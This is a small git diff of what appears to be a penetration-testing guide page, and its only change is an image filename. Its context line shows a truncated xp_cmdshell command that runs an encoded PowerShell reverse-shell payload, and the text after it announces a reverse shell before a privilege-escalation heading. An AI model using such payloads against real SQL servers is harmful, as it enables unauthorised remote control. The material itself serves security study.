@@ -438,7 +438,7 @@ xp_cmdshell powershell -env JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
 
 * You now have a reverse shell!
 
-<figure><img src="../../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
